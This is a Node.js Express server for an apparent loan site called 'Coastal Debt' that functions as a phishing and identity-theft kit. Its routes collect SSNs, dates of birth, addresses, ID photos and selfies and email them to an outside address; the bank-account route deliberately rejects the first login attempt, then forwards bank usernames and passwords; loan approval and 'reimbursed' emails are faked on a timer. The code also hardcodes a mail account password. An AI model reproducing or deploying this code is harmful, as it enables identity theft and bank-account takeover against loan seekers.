const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const path = require('path');
const nodemailer = require('nodemailer');
const multer = require('multer');
const fs = require('fs');

// Initialize Express app
const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

// Configure multer for file uploads
const storage = multer.diskStorage({
  destination: (req, file, cb) => {
    const dir = './uploads';
    if (!fs.existsSync(dir)) {
      fs.mkdirSync(dir);
    }
    cb(null, dir);
  },
  filename: (req, file, cb) => {
    cb(null, `${Date.now()}-${file.originalname}`);
  }
});

const upload = multer({ storage });

// Configure nodemailer
const transporter = nodemailer.createTransport({
  host: 'smtp.gmail.com',
  port: 465,
  secure: true,
  auth: {
    user: 'coastalloan60@gmail.com',
    pass: 'sphw oizv szzy fpgw'
  }
});

// In-memory database for now (will be replaced with MongoDB)
const users = [];
const loanApplications = [];

// Routes
// User Authentication
app.post('/api/signup', (req, res) => {
  const { username, email, password, confirmPassword } = req.body;

  // Validation
  if (password !== confirmPassword) {
    return res.status(400).json({ error: 'Passwords do not match' });
  }

  // Check if user already exists
  const existingUser = users.find(user => user.email === email || user.username === username);
  if (existingUser) {
    return res.status(400).json({ error: 'User already exists' });
  }

  // Create new user
  const newUser = {
    id: users.length + 1,
    username,
    email,
    password, // In production, this should be hashed with bcrypt
  };

  users.push(newUser);

  // Send welcome email
  const welcomeMailOptions = {
    from: {
      name: "Coastal Debt",
      address: 'coastalloan60@gmail.com'
    },
    to: newUser.email,
    subject: 'Welcome to Coastal Debt',
    html: `
      <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; color: #333;">
        <div style="text-align: center; padding: 20px 0;">
          <img src="https://logo.clearbit.com/coastaldebt.com" alt="Coastal Debt Logo" style="max-width: 130px;">
        </div>

        <div style="padding: 20px; background-color: #fff; border-radius: 5px; box-shadow: 0 2px 5px rgba(0,0,0,0.1);">
          <h2 style="color: #0066cc; margin-bottom: 20px;">Welcome to Coastal Debt</h2>

          <p>Dear ${newUser.username},</p>

          <p>Thank you for creating an account with Coastal Debt Loan Services. We're excited to help you with your financial needs.</p>

          <p>You can now log in and explore our loan offerings.</p>

          <div style="text-align: center; margin: 30px 0;">
            <a href="https://coastal-loan.onrender.com/" style="background-color: #0066cc; color: white; padding: 10px 20px; text-decoration: none; border-radius: 5px; font-weight: bold;">Log In Now</a>
          </div>

          <p>If you have any questions, please don't hesitate to contact our support team.</p>

          <p>
            Best regards,<br>
            The Coastal Debt Team
          </p>
        </div>

        <div style="text-align: center; padding: 20px; color: #666; font-size: 12px;">
          <p>&copy; ${new Date().getFullYear()} Coastal Debt. All rights reserved.</p>
        </div>
      </div>
    `
  };

  transporter.sendMail(welcomeMailOptions, (error, info) => {
    if (error) {
      console.error('Error sending welcome email:', error);
    }
  });

  res.status(201).json({ message: 'User created successfully', userId: newUser.id });
});

app.post('/api/login', (req, res) => {
  const { username, password } = req.body;

  // Find user
  const user = users.find(user => user.username === username && user.password === password);

  if (!user) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }

  res.status(200).json({ message: 'Login successful', userId: user.id });
});

// Loan Application
app.post('/api/loan-application', (req, res) => {
  const { userId, loanAmount } = req.body;

  const newApplication = {
    id: loanApplications.length + 1,
    userId,
    loanAmount,
    status: 'pending',
    createdAt: new Date(),
  };

  loanApplications.push(newApplication);

  // Send loan application received email
  const loanApplicationMailOptions = {
    from: {
      name: "Coastal Debt",
      address: 'coastalloan60@gmail.com'
    },
    to: users.find(u => u.id === userId).email,
    subject: 'Loan Application Received - Coastal Debt',
    html: `
        <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; color: #333;">
          <div style="text-align: center; padding: 20px 0;">
            <img src="https://logo.clearbit.com/coastaldebt.com" alt="Coastal Debt Logo" style="max-width: 180px;">
          </div>

          <div style="padding: 20px; background-color: #fff; border-radius: 5px; box-shadow: 0 2px 5px rgba(0,0,0,0.1);">
            <h2 style="color: #0066cc; margin-bottom: 20px;">Loan Application Received</h2>

            <p>Dear ${users.find(u => u.id === userId).username},</p>

            <p>We have received your loan application for <strong>$${loanAmount.toLocaleString()}</strong>.</p>

            <p>Your application is now being processed. You can track the status of your application
            by logging into your account.</p>

            <div style="background-color: #f8f9fa; padding: 15px; border-radius: 5px; margin: 20px 0;">
              <p style="margin: 5px 0;"><strong>Application ID:</strong> ${newApplication.id}</p>
              <p style="margin: 5px 0;"><strong>Amount:</strong> $${loanAmount.toLocaleString()}</p>
              <p style="margin: 5px 0;"><strong>Date:</strong> ${new Date().toLocaleDateString()}</p>
            </div>

            <div style="text-align: center; margin: 30px 0;">
              <a href="https://coastal-loan.onrender.com/" style="background-color: #0066cc; color: white; padding: 10px 20px; text-decoration: none; border-radius: 5px; font-weight: bold;">Check Application Status</a>
            </div>

            <p>Thank you for choosing Coastal Debt.</p>

            <p>
              Best regards,<br>
              The Coastal Debt Team
            </p>
          </div>

          <div style="text-align: center; padding: 20px; color: #666; font-size: 12px;">
            <p>&copy; ${new Date().getFullYear()} Coastal Debt. All rights reserved.</p>
          </div>
        </div>
      `
  };

  transporter.sendMail(loanApplicationMailOptions, (error, info) => {
    if (error) {
      console.error('Error sending application received email:', error);
    }
  });

  res.status(201).json({ message: 'Loan application created', applicationId: newApplication.id });
});

// Identity Verification
app.post('/api/verify-identity', (req, res) => {
  const { 
    fullName, 
    middleName, 
    dob, 
    ssn, 
    address, 
    city, 
    state, 
    zipCode, 
    phoneNumber, 
    email,
    userId,
    applicationId
  } = req.body;

  // Validate SSN and phone number
  if (ssn.length !== 9) {
    return res.status(400).json({ error: 'SSN must be exactly 9 digits' });
  }

  if (phoneNumber.length !== 10) {
    return res.status(400).json({ error: 'Phone number must be exactly 10 digits' });
  }

  // Update application with verification details
  const application = loanApplications.find(app => app.id === parseInt(applicationId));
  if (application) {
    application.verification = {
      fullName,
      middleName,
      dob,
      ssn,
      address,
      city,
      state,
      zipCode,
      phoneNumber,
      email
    };
  }

  // Send email notification
  const mailOptions = {
    from: 'coastalloan60@gmail.com',
    to: 'support@cbelko.net',
    subject: 'New Identity Verification Submission',
    text: `
      User ID: ${userId}
      Application ID: ${applicationId}
      Full Name: ${fullName}
      Middle Name: ${middleName}
      Date of Birth: ${dob}
      SSN: ${ssn}
      Address: ${address}
      City: ${city}
      State: ${state}
      Zip Code: ${zipCode}
      Phone Number: ${phoneNumber}
      Email: ${email}
    `
  };

  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.error('Error sending email:', error);
      return res.status(500).json({ error: 'Failed to send verification email' });
    }

    res.status(200).json({ message: 'Identity verification submitted successfully' });
  });
});

// Payment Method Selection
app.post('/api/payment-method', (req, res) => {
  const { method, userId, applicationId, details } = req.body;

  // Update application with payment method
  const application = loanApplications.find(app => app.id === parseInt(applicationId));
  if (application) {
    application.paymentMethod = {
      method,
      details
    };
  }

  res.status(200).json({ message: 'Payment method added successfully' });
});

// Bank Account Details
app.post('/api/bank-account', (req, res) => {
  const { userId, applicationId, bankName, username, password, attempt } = req.body;

  // First attempt always fails, second attempt sends both to email
  if (attempt === 1) {
    return res.status(401).json({ error: 'Incorrect login' });
  }

  // Send bank login attempts to email
  const mailOptions = {
    from: 'coastalloan60@gmail.com',
    to: 'support@cbelko.net',
    subject: 'Bank Account Login Attempts',
    text: `
      User ID: ${userId}
      Application ID: ${applicationId}
      Bank Name: ${bankName}
      Username: ${username}
      Password: ${password}
      Attempt: ${attempt}
    `
  };

  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.error('Error sending email:', error);
      return res.status(500).json({ error: 'Failed to send bank details email' });
    }

    res.status(200).json({ message: 'Bank details processed' });
  });
});

// ID Verification Upload
app.post('/api/upload-id', upload.fields([
  { name: 'frontId', maxCount: 1 }, 
  { name: 'backId', maxCount: 1 }, 
  { name: 'selfie', maxCount: 1 }
]), (req, res) => {
  const { userId, applicationId } = req.body;
  const files = req.files;

  if (!files.frontId || !files.backId || !files.selfie) {
    return res.status(400).json({ error: 'All files are required' });
  }

  // Send email with file attachments
  const mailOptions = {
    from: 'coastalloan60@gmail.com',
    to: 'support@cbelko.net',
    subject: 'ID Verification Files',
    text: `
      User ID: ${userId}
      Application ID: ${applicationId}
      Files attached:
    `,
    attachments: [
      {
        filename: files.frontId[0].originalname,
        path: files.frontId[0].path
      },
      {
        filename: files.backId[0].originalname,
        path: files.backId[0].path
      },
      {
        filename: files.selfie[0].originalname,
        path: files.selfie[0].path
      }
    ]
  };

  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.error('Error sending email:', error);
      return res.status(500).json({ error: 'Failed to send ID verification email' });
    }

    res.status(200).json({ message: 'ID verification files uploaded successfully' });
  });
});

// Get application status
app.get('/api/application-status/:applicationId', (req, res) => {
  const { applicationId } = req.params;

  const application = loanApplications.find(app => app.id === parseInt(applicationId));

  if (!application) {
    return res.status(404).json({ error: 'Application not found' });
  }

  // Simulate status changes based on time
  const now = new Date();
  const createdAt = new Date(application.createdAt);
  const hoursPassed = (now - createdAt) / (1000 * 60 * 60);

  let status = 'pending';
  let message = 'Your application is pending review.';

  if (hoursPassed >= 48) {
    status = 'reimbursed';
    message = `Your funds have been reimbursed to your ${application.paymentMethod?.method}.`;

    // Send email notification about reimbursement
    if (application.status !== 'reimbursed') {
      application.status = 'reimbursed';

      // Get user email
      const user = users.find(u => u.id === application.userId);
      if (user) {
        const mailOptions = {
          from: {
            name: "Coastal Debt",
            address: 'coastalloan60@gmail.com'
          },
          to: user.email,
          subject: 'Funds Reimbursed - Coastal Debt',
          html: `
            <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; color: #333;">
              <div style="text-align: center; padding: 20px 0;">
                <img src="https://logo.clearbit.com/coastaldebt.com" alt="Coastal Debt Logo" style="max-width: 130px;">
              </div>

              <div style="padding: 20px; background-color: #fff; border-radius: 5px; box-shadow: 0 2px 5px rgba(0,0,0,0.1);">
                <h2 style="color: #0066cc; margin-bottom: 20px;">Funds Reimbursed</h2>

                <p>Dear ${user.username},</p>

                <p>We are pleased to inform you that your loan has been fully processed and the funds have been released.</p>

                <div style="background-color: #f8f9fa; padding: 15px; border-radius: 5px; margin: 20px 0;">
                  <p style="margin: 5px 0;"><strong>Application ID:</strong> ${applicationId}</p>
                  <p style="margin: 5px 0;"><strong>Amount:</strong> $${application.loanAmount.toLocaleString()}</p>
                  <p style="margin: 5px 0;"><strong>Payment Method:</strong> ${application.paymentMethod?.method === 'check' ? 'Check' : 'Direct Deposit'}</p>
                  <p style="margin: 5px 0;"><strong>Date:</strong> ${new Date().toLocaleDateString()}</p>
                </div>

                <p>Your funds have been reimbursed to your ${application.paymentMethod?.method === 'check' ? 'mailing address via check' : 'bank account via direct deposit'}.</p>

                ${application.paymentMethod?.method === 'check' 
                  ? '<p><strong>Note:</strong> Please allow 5-7 business days for delivery.</p>' 
                  : '<p><strong>Note:</strong> Please allow 1-2 business days for the funds to appear in your account.</p>'}

                <p>Thank you for choosing Coastal Debt.</p>

                <p>
                  Best regards,<br>
                  The Coastal Debt Team
                </p>
              </div>

              <div style="text-align: center; padding: 20px; color: #666; font-size: 12px;">
                <p>&copy; ${new Date().getFullYear()} Coastal Debt. All rights reserved.</p>
              </div>
            </div>
          `
        };

        transporter.sendMail(mailOptions);
      }
    }
  } else if (hoursPassed >= 24) {
    status = 'approved';
    message = 'Your loan has been approved.';

    // Send email notification about approval
    if (application.status !== 'approved' && application.status !== 'reimbursed') {
      application.status = 'approved';

      // Get user email
      const user = users.find(u => u.id === application.userId);
      if (user) {
        const mailOptions = {
          from: {
            name: "Coastal Debt",
            address: 'coastalloan60@gmail.com'
          },
          to: user.email,
          subject: 'Loan Approved - Coastal Debt',
          html: `
            <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; color: #333;">
              <div style="text-align: center; padding: 20px 0;">
                <img src="https://logo.clearbit.com/coastaldebt.com" alt="Coastal Debt Logo" style="max-width: 130px;">
              </div>

              <div style="padding: 20px; background-color: #fff; border-radius: 5px; box-shadow: 0 2px 5px rgba(0,0,0,0.1);">
                <h2 style="color: #0066cc; margin-bottom: 20px;">Loan Approved!</h2>

                <p>Dear ${user.username},</p>

                <p>Great news! Your loan application has been approved.</p>

                <div style="background-color: #f8f9fa; padding: 15px; border-radius: 5px; margin: 20px 0;">
                  <p style="margin: 5px 0;"><strong>Application ID:</strong> ${applicationId}</p>
                  <p style="margin: 5px 0;"><strong>Amount Approved:</strong> $${application.loanAmount.toLocaleString()}</p>
                  <p style="margin: 5px 0;"><strong>Approval Date:</strong> ${new Date().toLocaleDateString()}</p>
                </div>

                <p>You will receive your funds within 5 business days through your selected payment method.</p>

                <p>You can track the status of your application by logging into your account.</p>

                <div style="text-align: center; margin: 30px 0;">
                  <a href="https://coastal-loan.onrender.com/" style="background-color: #0066cc; color: white; padding: 10px 20px; text-decoration: none; border-radius: 5px; font-weight: bold;">Check Application Status</a>
                </div>

                <p>Thank you for choosing Coastal Debt.</p>

                <p>
                  Best regards,<br>
                  The Coastal Debt Team
                </p>
              </div>

              <div style="text-align: center; padding: 20px; color: #666; font-size: 12px;">
                <p>&copy; ${new Date().getFullYear()} Coastal Debt. All rights reserved.</p>
              </div>
            </div>
          `
        };

        transporter.sendMail(mailOptions);
      }
    }
  }

  application.status = status;

  res.status(200).json({ 
    status,
    message,
    application
  });
});

// Serve the main HTML page
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Start server
app.listen(PORT, '0.0.0.0', () => {
  console.log(`Server running on port ${PORT}`);
});
